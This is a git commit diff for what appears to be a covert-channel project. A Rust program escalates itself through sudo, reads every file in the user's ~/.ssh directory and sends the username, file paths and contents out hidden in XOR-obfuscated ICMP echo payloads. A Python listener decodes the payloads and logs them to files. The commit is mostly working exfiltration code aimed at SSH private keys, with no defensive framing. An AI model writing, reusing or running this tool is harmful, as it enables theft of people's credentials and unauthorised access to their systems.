5e9189fd2ea1a2dd8aaa95b8fa3351aef0a27d9e
Will Tekulve <tekulve.will@gmail.com>
2020-04-27 13:48:56 -0400

    wip 2

--- icmp_listener/main.py
+++ icmp_listener/main.py
@@ -3,7 +3,6 @@
 ### Dumps source address, timestamp, and packet data into neatly organized files.
 ###
 ### Note: requires root to run
-### Note: echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all
 ###
 
 import os
@@ -11,7 +10,7 @@ import socket
 import time
 import struct
 
-from scapy.all import IP, ICMP
+from scapy.all import IP, ICMP, raw
 
 # Add any IP addresses to specially flag as interesting
 # Example 1: Flag all packets from 129.137.4.132 (gauss.ececs.uc.edu)
@@ -35,44 +34,42 @@ def listen():
     while True:
         unix_timestamp = int(time.time())
         data, addr = s.recvfrom(1508)
-        print(f"Got packet from {addr} at {unix_timestamp}: {data.hex()}")
+        print(f"Got packet from {addr[0]} at {unix_timestamp}:")  # {data.hex()}")
 
-        data = data[56:]
+        packet = IP(data)
+        # print(packet.summary())
+        # print(packet.show())
 
-        unpack_payload(data)
+        icmp = packet[ICMP]
+        icmp_type = icmp.type
+        icmp_code = icmp.code
+        icmp_chksum = icmp.chksum
+        icmp_seq = icmp.seq
+        # print(icmp)
+        # print(icmp_type)
+        # print(icmp_code)
+        # print(icmp_chksum)
+        # print(icmp_seq)
 
-        # Example packet:
-        # b'E\x00@\x00\x9c+\x00\x00@\x01\x00\x00\x7f\x00\x00\x01\x7f\x00\x00\x01\x00\x00\x95\xdd8\xc2\x00\x00^\xa63c\x00\x08\xb4K\x08\t\n\x0b\x0c\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f !"#$%&\'()*+,-./01234567'
-        code = int(data[0])
-        icmp_type = int(data[1])
-        icmp_checksum = data[2:3]
-        icmp_data = data[3:]
+        raw_icmp = raw(icmp)
+        key = int.from_bytes(raw_icmp[8:9], "big")
+        print("key:", key)
+        payload = raw_icmp[9:]
 
-        print(type(data))
-        print(type(icmp_data))
+        def decode(byte):
+            return byte ^ key if byte != key and byte != 0 else byte
 
-        # Custom Packet Layout
-        # identifier - contains XOR key for data
-        # identifier = icmp_data[:2]  # first 16 bits of 'rest of header'
+        decoded = [decode(byte) for byte in payload]
+        # print(decoded)
+        try:
+            decoded = decoded[: decoded.index(0)]
+        except ValueError:
+            pass
 
-        # sequence number
-        # sequence_number = icmp_data[2:4]  # second 16 bits of 'rest of header'
+        decoded_string = "".join(chr(ch) for ch in decoded)
 
-        # payload data
-        # payload_data = icmp_data[4:]  # rest of packet data
-
-        # XOR identifier with the payload_data
-        # xored_bytes = [
-        #     int(identifier) ^ int(payload_data_byte)
-        #     for payload_data_byte in payload_data
-        # ]
-
-        # print(xored_bytes.decode("ascii"))
-
-        # print('code:', code)
-        # print('type:', icmp_type)
-        # print('checksum:', icmp_checksum)
-        # print('icmp_data:', icmp_data)
+        # print(decoded)
+        print(decoded_string)
 
         # Bucket files by the hour
         unix_hour = (
@@ -82,31 +79,16 @@ def listen():
 
         # Save packet data in timestamped files for a specific window of time
         # This is not the best way to do this, but whatever it works
-        log_packet(file_name, addr[0], unix_timestamp, icmp_data)
+        log_packet(file_name, addr[0], unix_timestamp, decoded_string)
 
         # Check if packet should be specially flagged
         if addr[0].startswith(tuple(IPS_TO_FLAG)):
             # Also log this packet to the flagged datafile
             special_file_name = f"flagged-icmp-listener-{unix_hour}.txt"
-            log_packet(special_file_name, addr[0], unix_timestamp, icmp_data)
-
-
-def unpack_payload(data):
-    icmp_type, code, checksum, identifier, sequence = struct.unpack("!ccHHH", data[:8])
-    print(
-        f"code: {code}, type: {icmp_type}, checksum: {checksum} identifier: {identifier}, sequence: {sequence}"
-    )
-    payload = data[8:]
-
-    decoded = [byte ^ int(identifier) for byte in payload]
-
-    print(f"decoded: {decoded}")
-
-    return identifier, decoded
+            log_packet(special_file_name, addr[0], unix_timestamp, decoded_string)
 
 
 if __name__ == "__main__":
-    print("hello, world.")
     print("IPs to flag:", IPS_TO_FLAG)
     listen()  # needs root access, test with `ping 127.0.0.1`
     print("Listener is waiting for incoming pings..")
--- src/main.rs
+++ src/main.rs
@@ -4,16 +4,23 @@ use pnet::packet::ipv4::MutableIpv4Packet;
 use pnet::packet::Packet;
 use pnet::transport::{icmp_packet_iter, transport_channel, TransportChannelType::Layer3};
 
+use dirs;
 use rand;
+use users;
 
+use std::env::{args, current_exe};
+use std::fs::File;
+use std::io::prelude::*;
 use std::net;
+use std::path::PathBuf;
+use std::process::Command;
 use std::str::FromStr;
 
 const IPV4_HEADER_LEN: usize = 21;
 const ICMP_HEADER_LEN: usize = 8;
 const ICMP_PAYLOAD_LEN: usize = 32;
 
-fn attempt_false_icmp(msg: &String) -> Result<(), ()> {
+fn attempt_false_icmp(msg: &[u8]) -> Result<(), ()> {
     let protocol = Layer3(IpNextHeaderProtocols::Icmp);
     let (mut tx, mut rx) = transport_channel(2048, protocol).unwrap();
 
@@ -35,10 +42,19 @@ fn attempt_false_icmp(msg: &String) -> Result<(), ()> {
     ipv4_packet.set_destination(ip_addr);
 
     let xor_key: u8 = rand::random();
-    let data: Vec<u8> = msg.as_bytes().iter().map(|b| b ^ xor_key).collect();
+    let mut data: Vec<u8> = msg
+        .iter()
+        .map(|b| {
+            if *b == xor_key || *b == 0 {
+                *b
+            } else {
+                *b ^ xor_key
+            }
+        })
+        .collect();
 
     println!(
-        "Orig: {}\nXOR Key: {}\nEncoded: {:?}",
+        "Orig: {:?}\nXOR Key: {}\nEncoded: {:?}",
         msg,
         xor_key,
         data.as_slice()
@@ -46,7 +62,8 @@ fn attempt_false_icmp(msg: &String) -> Result<(), ()> {
 
     let mut icmp_packet = MutableEchoRequestPacket::new(&mut icmp_buffer).unwrap();
     icmp_packet.set_icmp_type(IcmpTypes::EchoRequest);
-    // icmp_packet.set_identifier(xor_key as u16);
+
+    data.insert(0, xor_key);
     icmp_packet.set_payload(&data);
 
     let checksum = pnet::util::checksum(&icmp_packet.packet(), 2);
@@ -60,10 +77,87 @@ fn attempt_false_icmp(msg: &String) -> Result<(), ()> {
     Err(())
 }
 
-fn main() {
-    let msg = String::from("hello noah test test test");
-    match attempt_false_icmp(&msg) {
-        Ok(_) => print!("Sent Fake ICMP packet with msg {}", msg),
-        _ => (),
+fn get_ssh_filepaths() -> Vec<PathBuf> {
+    let mut home_dir = match dirs::home_dir() {
+        Some(p) => p,
+        None => return Vec::new(),
+    };
+
+    home_dir.push(".ssh");
+
+    match home_dir.as_path().read_dir() {
+        Ok(dir_iter) => dir_iter
+            .filter_map(|dir_entry| match dir_entry {
+                Ok(entry) => {
+                    if let Ok(file_type) = entry.file_type() {
+                        if file_type.is_file() {
+                            Some(entry.path())
+                        } else {
+                            None
+                        }
+                    } else {
+                        None
+                    }
+                }
+                _ => None,
+            })
+            .collect(),
+        Err(_) => Vec::new(),
     }
+}
+
+fn get_file_data(path: &PathBuf) -> Result<File, ()> {
+    if !path.exists() || !path.is_file() {
+        return Err(());
+    }
+
+    File::open(path).map_err(|_| ())
+}
+
+fn main() {
+    if args().len() < 2 {
+        // This is strictly why NOPASSWD is a bad thing.
+        let mut child = Command::new("sudo")
+            .arg(current_exe().unwrap())
+            .arg(
+                users::get_current_username()
+                    .unwrap()
+                    .into_string()
+                    .unwrap(),
+            )
+            .spawn()
+            .unwrap();
+
+        child.wait().unwrap();
+        return;
+    }
+
+    let username = args().nth(1).unwrap();
+
+    let paths = get_ssh_filepaths();
+
+    for p in paths {
+        println!("{}", p.to_str().unwrap());
+
+        if let Ok(file) = get_file_data(&p) {
+            let mut to_send: Vec<u8> = username.bytes().collect();
+            let mut path: Vec<u8> = p.as_path().to_str().unwrap().bytes().collect();
+            for _ in 0..5 {
+                path.insert(0, 64);
+            }
+            to_send.extend(path);
+            let data: Vec<u8> = file.bytes().map(|byte| byte.unwrap()).collect();
+            to_send.extend(data);
+
+            for window in to_send.chunks(71) {
+                let _ = attempt_false_icmp(window);
+            }
+        }
+    }
+
+    // let msg = String::from("hello noah test test test");
+    // match attempt_false_icmp(&msg) {
+    //     Ok(_) => print!("Sent Fake ICMP packet with msg {}", msg),
+    //     _ => (),
+    // }
 }
